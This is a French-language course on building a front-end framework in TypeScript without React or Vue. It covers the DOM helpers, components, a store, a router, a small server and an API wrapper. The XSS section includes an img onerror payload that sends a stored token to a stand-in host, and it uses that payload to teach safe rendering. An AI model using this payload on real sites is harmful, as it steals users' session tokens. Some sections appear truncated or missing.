Framework maison

HTML · CSS · TypeScript — projet IntraVerse

Étape 1

Construire son framework front maison

HTML sémantique, CSS et TypeScript, sans React ni Vue. Dans IntraVerse, tu dois coder toi-même ce qu'un framework te donne d'habitude : un design system, des composants, un état partagé, un routeur et une couche d'accès à l'API.

⚠️ La règle du projet

Le sujet interdit les IA génératrices de code et les frameworks frontend. Ce cours te sert à comprendre les mécanismes : les exemples sont volontairement génériques (compteur, formulaire…). Le code d'IntraVerse, c'est toi qui l'écris, à partir de ces principes. Chaque étape se termine par un exercice « À toi de jouer » pour ça.

L'architecture

On sépare le noyau (le framework, réutilisable dans n'importe quel projet) de l'application (les pages d'IntraVerse). C'est la même idée qu'un vendor/ en Symfony : le noyau ne connaît rien du métier.

Compiler TypeScript sans bundler

Le navigateur ne comprend pas le TypeScript. Sans Vite ni webpack, c'est tsc qui transforme src/**/*.ts en public/js/**/*.js, et le navigateur charge directement les modules ES.

tsconfig.json
{
  "compilerOptions": {
    "target": "es2022",
    "module": "esnext",
    "moduleResolution": "bundler",
    "lib": ["es2022", "dom", "dom.iterable"],
    "rootDir": "./src",
    "outDir": "./public/js",
    "strict": true,
    "noUncheckedIndexedAccess": true,
    "sourceMap": true
  },
  "include": ["src"]
}
OptionPourquoi
module: esnextGarde les import/export : le navigateur les gère nativement.
moduleResolution: bundlerMode moderne. Depuis TypeScript 6/7, node/node10 ne sont plus acceptés.
lib: domDonne les types HTMLElement, Event, fetch…
strict + noUncheckedIndexedAccessstrict est déjà le défaut en TS 7 ; la seconde option te force à gérer le cas « case de tableau vide ».
sourceMapDans les DevTools, tu débugues ton .ts et non le .js généré.
⛔ Le piège n°1 : l'extension dans les imports

Le navigateur ne devine pas les extensions. Écris tes imports avec .js, même dans un fichier .ts : import { h } from '../core/dom.js'. TypeScript comprend qu'il s'agit de dom.ts, et le fichier généré pointe vers le bon fichier. Sans l'extension, tu auras une erreur 404 dans la console.

public/index.html
<!doctype html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>IntraVerse</title>
  <link rel="stylesheet" href="/css/tokens.css">
  <link rel="stylesheet" href="/css/base.css">

type="module" fait trois choses : il active les import, il exécute le script après le parsing du HTML (comme defer), et il active le mode strict JS.

Organiser la cascade avec @layer

Problème classique : une classe utilitaire .mt-0 doit toujours gagner sur .card, même si .card est déclarée plus bas. @layer fixe l'ordre de priorité une fois pour toutes : la dernière couche déclarée gagne, peu importe la spécificité des sélecteurs.

Les couches
/* En haut de tokens.css : l'ordre de priorité, du plus faible au plus fort */
@layer reset, base, components, utilities;

/* Puis dans chaque fichier */
@layer components {
  .card { margin-top: var(--space-4); }
}
@layer utilities {
  .mt-0 { margin-top: 0; }   /* gagne toujours sur .card */
}
💡 Le même principe que Tailwind

Tailwind utilise exactement ces trois couches (base, components, utilities). Tu reproduis son fonctionnement, sans CLI ni PostCSS : c'est ce que le sujet appelle un « mini-Tailwind ».

Étape 4

Manipuler le DOM avec TypeScript

Sans JSX, il faut une façon courte et typée de créer des éléments. On écrit deux petites fonctions qui seront la base de tout le reste.

Le problème de querySelector

Ce que TypeScript te reproche
const btn = document.querySelector('#save');
btn.disabled = true;
// ❌ 'btn' is possibly 'null'
// ❌ Property 'disabled' does not exist on type 'Element'

Deux problèmes : l'élément peut ne pas exister (null), et TypeScript ne sait pas que c'est un bouton. La solution : un générique et une vérification.

Version typée
const btn = document.querySelector<HTMLButtonElement>('#save');
if (btn) btn.disabled = true;      // ✅ vérification explicite

// Raccourci : une fonction qui lève une erreur si l'élément manque
const btn2 = $<HTMLButtonElement>('#save');
btn2.disabled = true;               // ✅ jamais null

La fonction h() : ton JSX maison

C'est l'équivalent de React.createElement, la fonction en laquelle JSX est compilé. Grâce à HTMLElementTagNameMap, TypeScript sait que h('input') renvoie un HTMLInputElement et te propose les bonnes propriétés (value, type…).

src/core/dom.ts
type Child = Node | string | number | false | null | undefined;

type Props<K extends keyof HTMLElementTagNameMap> =
  Partial<Omit<HTMLElementTagNameMap[K], 'style' | 'dataset'>> & {
    class?: string;
    dataset?: Record<string, string>;
  };

export function h<K extends keyof HTMLElementTagNameMap>(
  tag: K,
  props: Props<K> = {},
  ...children: Child[]
): HTMLElementTagNameMap[K] {
  const el = document.createElement(tag);
  const { class: className, dataset, ...rest } = props;

  if (className) el.className = className;
  if (dataset) Object.assign(el.dataset, dataset);
  Object.assign(el, rest);

  for (const child of children) {
    if (child === false || child === null || child === undefined) continue;
    el.append(child instanceof Node ? child : String(child));
  }
  return el;
}

export function $<T extends Element = HTMLElement>(selector: string, root: ParentNode = document): T {
  const el = root.querySelector<T>(selector);
  if (!el) throw new Error(`Élément introuvable : ${selector}`);
  return el;
}

Sécurité : textContent, jamais innerHTML avec des données

Le sujet demande une « partie frontale sécurisée ». La faille n°1 côté front est le XSS : afficher du texte venant d'un utilisateur comme du HTML.

XSS
// Un étudiant écrit ce commentaire dans son rendu :
const comment = '<img src=x onerror="fetch(`https://pirate.io?t=${localStorage.token}`)">';

// ❌ Le navigateur crée l'image, l'erreur se déclenche, le script s'exécute
div.innerHTML = `<p>${comment}</p>`;

// ✅ Le texte est affiché tel quel, rien n'est interprété
p.textContent = comment;

// ✅ h() utilise append(string), qui crée un nœud texte : sûr aussi
h('p', {}, comment);
⛔ La règle

innerHTML uniquement avec du HTML que tu as écrit en dur. Dès qu'une donnée vient de l'API, d'une URL ou d'un formulaire : textContent, append() ou h(). React fait cette protection automatiquement ; ici, c'est à toi d'y penser.

Les événements et la délégation

Au lieu de mettre un écouteur sur chacun des 50 boutons d'une liste, on en met un seul sur le parent, et on regarde quel élément a été cliqué. Avantage : ça marche aussi pour les éléments ajoutés plus tard.

Délégation d'événements
list.addEventListener('click', (e) => {
  // closest() remonte du clic jusqu'au bouton (même si on clique sur une icône dedans)
  const btn = (e.target as Element).closest<HTMLButtonElement>('button[data-action]');
  if (!btn) return;

  const id = Number(btn.dataset.id);
  switch (btn.dataset.action) {
    case 'delete': deleteProject(id); break;
    case 'edit':   openEditor(id);    break;
  }
});

Les attributs data-* sont accessibles via element.dataset : data-action="edit" devient btn.dataset.action. Ce sont toujours des chaînes, d'où le Number().

Étape 5

Des composants réutilisables

Le sujet vise la compétence « développer des interfaces utilisateur réutilisables de type composant ». On crée une classe de base dont tous les composants héritent : elle gère le montage, le re-render et le nettoyage.

Le cycle de vie

MéthodeRôleÉquivalent React
render()Construit et renvoie l'élémentLe corps de la fonction composant
mount(container)Insère dans la pagecreateRoot().render()
onMount()Ajoute les écouteurs, lance un fetchuseEffect(() => …, [])
update()Reconstruit et remplaceRe-render après setState
unmount()Retire et nettoieFonction de retour de useEffect
src/core/component.ts
export abstract class Component<P extends object = object> {
  protected root: HTMLElement | null = null;
  private abort = new AbortController();

  constructor(protected props: P) {}

  protected abstract render(): HTMLElement;

  protected onMount(): void {}

  protected get signal(): AbortSignal {
    return this.abort.signal;
  }

  mount(container: HTMLElement): void {
    this.root = this.render();
    container.replaceChildren(this.root);
    this.onMount();
  }

  update(): void {
    if (!this.root) return;
    this.abort.abort();
    this.abort = new AbortController();
    const next = this.render();
    this.root.replaceWith(next);
    this.root = next;
    this.onMount();
  }

  unmount(): void {
    this.abort.abort();
    this.root?.remove();
    this.root = null;
  }
}

Pourquoi un AbortController ?

Si on reconstruit un composant sans retirer ses anciens écouteurs, ils restent en mémoire et se déclenchent en double : c'est une fuite mémoire. Passer { signal } à addEventListener permet de tous les supprimer d'un coup avec abort(). Le même signal peut être passé à fetch() pour annuler une requête quand on quitte la page.

Utilisation du signal
protected onMount(): void {
  // retiré automatiquement à chaque update() et unmount()
  window.addEventListener('resize', this.onResize, { signal: this.signal });

  // annulé si le composant disparaît avant la réponse
  fetch('/api/projects', { signal: this.signal });
}

Étape 6

Un état partagé et réactif

L'utilisateur connecté, la liste des projets ou le thème sont utilisés par plusieurs composants. On les place dans un store : quand il change, il prévient tous ceux qui se sont abonnés.

Le pattern Observer

Le store garde une liste de fonctions (les listeners). À chaque set(), il les appelle toutes. C'est le même principe que les événements du DOM ou l'EventDispatcher de Symfony.

src/core/store.ts
type Listener<S> = (state: S, prev: S) => void;

export class Store<S extends object> {
  private listeners = new Set<Listener<S>>();

  constructor(private state: S) {}

  get(): Readonly<S> {
    return this.state;
  }

  set(patch: Partial<S> | ((s: S) => Partial<S>)): void {
    const prev = this.state;
    const changes = typeof patch === 'function' ? patch(prev) : patch;
    this.state = { ...prev, ...changes };
    this.listeners.forEach((fn) => fn(this.state, prev));
  }

  subscribe(fn: Listener<S>): () => void {
    this.listeners.add(fn);
    return () => this.listeners.delete(fn);
  }
}
  • set() crée un nouvel objet au lieu de modifier l'ancien (immutabilité, comme setState en React). Les listeners peuvent ainsi comparer state et prev.
  • subscribe() renvoie une fonction de désabonnement, comme le nettoyage de useEffect.
  • Set plutôt qu'un tableau : on ne peut pas abonner deux fois la même fonction.

Ne re-render que si c'est utile


Avec un seul gros store, chaque changement re-render tout le monde. On ajoute un sélecteur : le composant ne se met à jour que si la partie qui l'intéresse a changé.


Sélecteur
function select<S extends object, T>(
  store: Store<S>,
  selector: (s: S) => T,
  onChange: (value: T) => void,
): () => void {
  return store.subscribe((state, prev) => {
    const next = selector(state);
    if (next !== selector(prev)) onChange(next);
  });
}

// Le header ne se re-render que quand l'utilisateur change

Le routeur complet


src/core/router.ts
export type Params = Record<string, string>;
export type Role = 'student' | 'trainer' | 'admin';

export interface Route {
  path: string;
  view: (params: Params) => HTMLElement;
  roles?: Role[];
}

interface CompiledRoute extends Route {
  regex: RegExp;
  keys: string[];
}

function compile(route: Route): CompiledRoute {
  const keys: string[] = [];
  const pattern = route.path.replace(/:(\w+)/g, (_, key: string) => {
    keys.push(key);
    return '([^/]+)';
  });
  return { ...route, keys, regex: new RegExp(`^${pattern}/?$`) };
}

export class Router {
  private routes: CompiledRoute[];

  constructor(
    routes: Route[],
    private outlet: HTMLElement,
    private getRole: () => Role | null,
  ) {
    this.routes = routes.map(compile);

    document.addEventListener('click', (e) => {
      const link = (e.target as Element).closest<HTMLAnchorElement>('a[data-link]');
      if (!link || e.ctrlKey || e.metaKey) return;
      e.preventDefault();
      this.navigate(link.pathname);
    });

    window.addEventListener('popstate', () => this.resolve());
  }

  navigate(path: string): void {
    if (path === location.pathname) return;
    history.pushState({}, '', path);
    this.resolve();
  }

  resolve(): void {
    const path = location.pathname;

    for (const route of this.routes) {
      const match = path.match(route.regex);
      if (!match) continue;

      if (route.roles) {
        const role = this.getRole();
        if (!role) return this.navigate('/login');
        if (!route.roles.includes(role)) return this.show(this.forbidden());
      }

      const params: Params = {};
      route.keys.forEach((key, i) => {
        params[key] = decodeURIComponent(match[i + 1] ?? '');
      });
      return this.show(route.view(params));
    }
    this.show(this.notFound());
  }

  private show(view: HTMLElement): void {
    this.outlet.replaceChildren(view);
    view.querySelector<HTMLElement>('h1')?.focus();
  }

  private notFound(): HTMLElement {
    const el = document.createElement('h1');
    el.textContent = 'Page introuvable';
    return el;
  }

  private forbidden(): HTMLElement {
    const el = document.createElement('h1');
    el.textContent = 'Accès refusé';
    return el;
  }
}


Comment fonctionnent les paramètres


compile() transforme /projets/:id en expression régulière ^/projets/([^/]+)/?$ et retient le nom id. Quand l'URL /projets/42 correspond, le groupe capturé 42 est associé à la clé : params = { id: '42' }. C'est ce que fait useParams() en React Router, ou {id} dans une route Symfony.

Le roles: ['trainer'] évite d'afficher une page inutile, c'est du confort. Mais n'importe qui peut modifier le JavaScript dans DevTools. Accessibilité : gérer le focus


Quand une page se recharge, le lecteur d'écran annonce le nouveau titre. Dans une SPA, rien ne se passe : l'utilisateur aveugle ne sait pas que la page a changé. C'est pour ça que show() place le focus sur le <h1> de la nouvelle vue. Pense à mettre tabindex="-1" sur ce h1 pour qu'il puisse recevoir le focus, et à mettre à jour document.title.



Le serveur doit renvoyer index.html


Si l'utilisateur recharge sur /projets/3, le navigateur demande ce fichier au serveur, qui n'existe pas. Le serveur doit renvoyer index.html pour toute URL inconnue (hors /api), et le routeur prendra le relais.


Option A : serveur node:http (extrait)
import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { extname, join, normalize } from 'node:path';

const PUBLIC_DIR = join(import.meta.dirname, '..', 'public');
const MIME: Record<string, string> = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.svg': 'image/svg+xml',
};

createServer(async (req, res) => {
  const url = new URL(req.url ?? '/', 'http://localhost');

  if (url.pathname.startsWith('/api/')) {
    // ... tes routes API
    return;
  }

  const filePath = normalize(join(PUBLIC_DIR, url.pathname));
  if (!filePath.startsWith(PUBLIC_DIR)) {
    res.writeHead(403).end();
    return;
  }

  try {
    const file = await readFile(filePath);
    res.writeHead(200, { 'Content-Type': MIME[extname(filePath)] ?? 'application/octet-stream' });
    res.end(file);
  } catch {
    const index = await readFile(join(PUBLIC_DIR, 'index.html'));
    res.writeHead(200, { 'Content-Type': MIME['.html']! });
    res.end(index);
  }
}).listen(3000);

La fonction api<T>()


src/core/api.ts
export class ApiError extends Error {
  constructor(
    public status: number,
    message: string,
    public details?: unknown,
  ) {
    super(message);
    this.name = 'ApiError';
  }
}

let token: string | null = null;
export const setToken = (t: string | null) => { token = t; };

export async function api<T>(path: string, init: RequestInit = {}): Promise<T> {
  const headers = new Headers(init.headers);
  headers.set('Accept', 'application/json');
  if (init.body && !(init.body instanceof FormData)) {
    headers.set('Content-Type', 'application/json');
  }
  if (token) headers.set('Authorization', `Bearer ${token}`);

  const res = await fetch(`/api${path}`, { ...init, headers });

  if (res.status === 204) return undefined as T;

  const data: unknown = await res.json().catch(() => null);

  if (!res.ok) {
    if (res.status === 401) {
      setToken(null);
      window.dispatchEvent(new CustomEvent('auth:expired'));
    }
    const message =
      typeof data === 'object' && data !== null && 'message' in data
        ? String(data.message)
        : res.statusText;
    throw new ApiError(res.status, message, data);
  }
  return data as T;
}

export const get = <T>(path: string) => api<T>(path);
export const post = <T>(path: string, body: unknown) =>
  api<T>(path, { method: 'POST', body: JSON.stringify(body) });


    

  • Le générique T : get<UserDto>('/me') renvoie une Promise<UserDto>. Attention, c'est une promesse faite à TypeScript, pas une vérification : si l'API renvoie autre chose, tu ne le sauras pas avant l'exécution.
    • 

  • fetch ne rejette pas sur un 404 ou un 500, seulement sur une erreur réseau. D'où le test if (!res.ok) et notre propre ApiError.
    • 

  • Le 204 No Content n'a pas de corps : appeler res.json() dessus planterait.
    • 

  • 401 : le token est expiré, on émet un événement global. Le main.ts l'écoute et redirige vers /login.
    •

function showErrors(form: HTMLFormElement, errors: Record<string, string>): void {
  for (const input of form.querySelectorAll<HTMLInputElement>('[name]')) {
    const message = errors[input.name] ?? '';
    input.setAttribute('aria-invalid', String(message !== ''));
    const slot = form.querySelector(`#${input.id}-error`);
    if (slot) slot.textContent = message;     // textContent : pas de XSS
  }
}

form.addEventListener('submit', async (e) => {
  e.preventDefault();
  const button = form.querySelector<HTMLButtonElement>('[type="submit"]')!;

  // 1. Validation native (required, type="url"…)
  if (!form.checkValidity()) {
    const errors: Record<string, string> = {};
    for (const input of form.querySelectorAll<HTMLInputElement>('[name]')) {
      if (!input.validity.valid) errors[input.name] = input.validationMessage;
    }
    return showErrors(form, errors);
  }

  // 2. Envoi : on bloque le bouton pour éviter le double clic
  button.disabled = true;
  button.textContent = 'Envoi…';
  try {
    await post('/submissions', Object.fromEntries(new FormData(form)));
    showErrors(form, {});
    form.reset();
  } catch (err) {
    // 3. Erreurs renvoyées par le serveur (400 avec détail par champ)
    if (err instanceof ApiError && err.status === 400) {
      const body = err.details as ApiErrorBody;
      showErrors(form, body.errors ?? {});
    } else {
      throw err;
    }
  } finally {
    button.disabled = false;
    button.textContent = 'Envoyer mon rendu';
  }
});


Styles liés à l'état
@layer components {
  [aria-invalid="true"] { border-color: var(--color-danger); }
  .field-error { color: var(--color-danger); font-size: var(--text-sm); min-height: 1.25em; }
}


💡 Styler l'état via les attributs ARIA
Au lieu d'ajouter une classe .is-invalid, on style directement [aria-invalid="true"]. Un seul attribut sert à la fois à l'accessibilité et au style : impossible que les deux se désynchronisent.


⛔ La validation front ne protège rien
Elle améliore l'expérience utilisateur. Le serveur doit refaire toutes les vérifications (format, échéance dépassée, droit de rendre ce projet…), car n'importe qui peut envoyer une requête avec curl.



🛠️ À toi de jouer
Code l'écran de connexion avec ces principes : validation de l'email, affichage de « Identifiants incorrects » sur un 401, bouton désactivé pendant l'envoi, et redirection vers le dashboard en cas de succès.
